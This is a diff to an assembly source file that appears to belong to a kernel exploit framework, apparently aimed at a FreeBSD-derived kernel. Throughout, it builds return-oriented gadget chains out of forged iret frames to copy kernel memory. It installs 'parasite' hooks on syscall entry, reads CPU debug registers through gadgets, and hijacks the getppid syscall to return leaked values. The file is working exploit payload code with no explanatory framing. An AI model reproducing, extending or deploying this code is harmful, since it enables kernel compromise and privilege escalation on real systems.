@@ -5,9 +5,13 @@ extern sysents
 extern syscall_after
 extern rep_movsb_pop_rbp_ret
 extern doreti_iret
-extern pop_all_iret
 extern push_pop_all_iret
+extern pop_all_iret
+extern pop_all_except_rdi_iret
 extern add_rsp_iret
+extern dr2gpr_start
+extern dr2gpr_end
+extern scratchpad
 
 %include "structs.inc"
 
@@ -46,8 +50,8 @@ dq 0
 regs_for_exit:
 times iret_ss+8 db 0
 
-; memcpy0 dest, src, size, retaddr
-%macro memcpy0 4
+; memcpy0f dest, src, size, retaddr, flags
+%macro memcpy0f 5
 ; assuming that rdi/rsi/rdx/rcx are the first 4 registers
 dq (%1)
 dq (%2)
@@ -57,7 +61,7 @@ times (iret_rip-32) db 0
 ; iret frame
 dq rep_movsb_pop_rbp_ret
 dq 0x20
-dq 2
+dq (%5)
 dq %%target
 dq 0
 %%target:
@@ -65,9 +69,34 @@ dq 0 ; rbp
 dq (%4) ; return address
 %endmacro
 
+; memcpy0 dest, src, size, retaddr
+%macro memcpy0 4
+memcpy0f (%1), (%2), (%3), (%4), 2
+%endmacro
+
+; rmemcpy0 dest, src, size, retaddr
+%macro rmemcpy0 4
+memcpy0f (%1), (%2), (%3), (%4), 0x402
+%endmacro
+
 ; memcpy dest, src, size
 %macro memcpy 3
 memcpy0 (%1), (%2), (%3), pop_all_iret
+%endmacro
+
+; rmemcpy dest, src, size
+%macro rmemcpy 3
+rmemcpy0 (%1), (%2), (%3), pop_all_iret
+%endmacro
+
+; memcat dest, src, size
+%macro memcat 3
+memcpy0 (%1), (%2), (%3), pop_all_except_rdi_iret
+%endmacro
+
+; rmemcat dest, src, size
+%macro rmemcat 3
+rmemcpy0 (%1), (%2), (%3), pop_all_except_rdi_iret
 %endmacro
 
 ; pokeq0 dest, value, retaddr
@@ -86,6 +115,21 @@ section .data
 %%value:
 dq (%2)
 section .text
+%endmacro
+
+; ptr_add_imm p_dest, p_ptr, imm
+%macro ptr_add_imm 3
+memcpy %%seek+iret_rsi, (%2), 8
+%%seek:
+memcpy0 scratchpad, 0, (%3), doreti_iret
+save_reg (%1), iret_rsi
+%endmacro
+
+; memcpy_offset p_dest, offset, src, size
+%macro memcpy_offset 4
+ptr_add_imm %%poke+iret_rdi, (%1), (%2)
+%%poke:
+memcpy 0, (%3), (%4)
 %endmacro
 
 ; cmpb ptr1, ptr2, is_less, is_equal, is_greater
@@ -134,9 +178,9 @@ cmpw (%1), (%2), (%3), (%4), (%5)
 
 ; cmpdbe ptr1, ptr2, is_less, is_equal, is_greater
 %macro cmpdbe 5
-cmpw (%1), (%2), (%3), %%next_check, (%5)
+cmpwbe (%1), (%2), (%3), %%next_check, (%5)
 %%next_check:
-cmpw (%1)+2, (%2)+2, (%3), (%4), (%5)
+cmpwbe (%1)+2, (%2)+2, (%3), (%4), (%5)
 %endmacro
 
 ; cmpq ptr1, ptr2, is_less, is_equal, is_greater
@@ -148,9 +192,9 @@ cmpd (%1), (%2), (%3), (%4), (%5)
 
 ; cmpqbe ptr1, ptr2, is_less, is_equal, is_greater
 %macro cmpqbe 5
-cmpd (%1), (%2), (%3), %%next_check, (%5)
+cmpdbe (%1), (%2), (%3), %%next_check, (%5)
 %%next_check:
-cmpd (%1)+4, (%2)+4, (%3), (%4), (%5)
+cmpdbe (%1)+4, (%2)+4, (%3), (%4), (%5)
 %endmacro
 
 ; cmpqi ptr1, imm, is_less, is_equal, is_greater
@@ -171,15 +215,8 @@ dq (%2)
 section .text
 %endmacro
 
-; log_word which
-%macro log_word 1
-cmpq log_area_cur, log_area_end, %%write, %%skip, %%write
-%%write:
-memcpy log_staging, iret_frame, 8
-memcpy log_staging+8, (%1), 8
-memcpy %%poke+iret_rdi, log_area_cur, 8
-%%poke:
-memcpy0 0, log_staging, 16, doreti_iret
+; save_reg where, what
+%macro save_reg 2
 dq push_pop_all_iret
 dq 0x20
 dq 2
@@ -195,7 +232,19 @@ dq 2
 dq %%after_regs_stash
 dq 0
 %%after_regs_stash:
-memcpy log_area_cur, %%regs_stash+iret_rdi, 8
+memcpy (%1), %%regs_stash+(%2), 8
+%endmacro
+
+; log_word which
+%macro log_word 1
+cmpq log_area_cur, log_area_end, %%write, %%skip, %%write
+%%write:
+memcpy log_staging, iret_frame, 8
+memcpy log_staging+8, (%1), 8
+memcpy %%poke+iret_rdi, log_area_cur, 8
+%%poke:
+memcpy0 0, log_staging, 16, doreti_iret
+save_reg log_area_cur, iret_rdi
 %%skip:
 %endmacro
 
@@ -265,13 +314,48 @@ cmpqibe iret_frame, (%1), %%next_check, (%2), %%next_check
 %%next_check:
 %endmacro
 
+; push_stack start, length
+%macro push_stack 2
+memcpy %%peek+iret_rsi, iret_frame+24, 8
+memcpy %%poke+iret_rdi, iret_frame+24, 8
+%%peek:
+memcpy %%stash, 0, 1
+%%poke:
+rmemcat 0, %%stash, 1
+rmemcat 0, (%1)+(%2)-1, (%2)
+memcpy0 0, %%stash, 1, doreti_iret
+save_reg iret_frame+24, iret_rdi
+section .data
+%%stash:
+db 0
+section .text
+%endmacro
+
+; read_dbgregs
+%macro read_dbgregs 0
+memcpy0 read_dbgregs_lr, %%lr, 8, doreti_iret
+dq pop_all_iret
+dq 0x20
+dq 2
+dq read_dbgregs_fn
+dq 0
+%%end_macro:
+section .data
+%%lr:
+dq %%end_macro
+section .text
+%endmacro
+
 prog_entry:
 
 %include "parasites.inc"
 
-on_rip syscall_before, handle_syscall_before
+; actual logic starts here
 
-; generic fallback
+on_rip syscall_before, handle_syscall_before
+on_rip dr2gpr_end, read_dbgregs_ret
+
+; generic fallback for unknown crashes
 
 decrypt_pointer_log regs_stash+iret_rax, 0
 decrypt_pointer_log regs_stash+iret_rcx, 1
@@ -304,7 +388,11 @@ cmpqibe regs_stash+iret_rax, sysents+48*39, decrypt_end, handle_getppid, decrypt
 
 handle_getppid:
 pokeq iret_frame, syscall_after
-pokeq0 regs_stash+iret_rax, 123456789, doreti_iret
+push_stack iret_frame, 40
+pokeq iret_frame, doreti_iret
+read_dbgregs
+memcpy_offset regs_stash+iret_rdi, td_retval, dbgregs+32, 8
+pokeq0 regs_stash+iret_rax, 0, doreti_iret
 dq pop_all_iret
 dq 0x20
 dq 2
@@ -327,6 +415,36 @@ decrypt_one decrypt_r12_only, iret_r12
 decrypt_one decrypt_r13_only, iret_r13
 decrypt_one decrypt_r14_only, iret_r14
 decrypt_one decrypt_r15_only, iret_r15
+
+read_dbgregs_fn:
+memcpy regs_for_exit, regs_stash, iret_rip
+memcpy regs_for_exit+iret_rip, iret_frame, 40
+times iret_r8 db 0
+dq 0xdeadbeefdeadbeef
+times (iret_rip-iret_r8-8) db 0
+dq dr2gpr_start
+dq 0x20
+dq 2
+dq 0
+dq 0
+read_dbgregs_ret:
+memcpy dbgregs, regs_stash+iret_r15, 8
+memcpy dbgregs+8, regs_stash+iret_r14, 8
+memcpy dbgregs+16, regs_stash+iret_r13, 8
+memcpy dbgregs+24, regs_stash+iret_r12, 8
+memcpy dbgregs+32, regs_stash+iret_r11, 8
+memcpy dbgregs+40, regs_stash+iret_rax, 8
+memcpy regs_stash, regs_for_exit, iret_rip
+memcpy0 iret_frame, regs_for_exit+iret_rip, 40, doreti_iret
+dq pop_all_iret
+dq 0x20
+dq 2
+read_dbgregs_lr:
+dq 0
+dq 0
+
+dbgregs:
+times 6 dq 0
 
 ; pseudocode:
 ; comparison_table[a][b] = 8 * (intcmp(a, b) + 1)
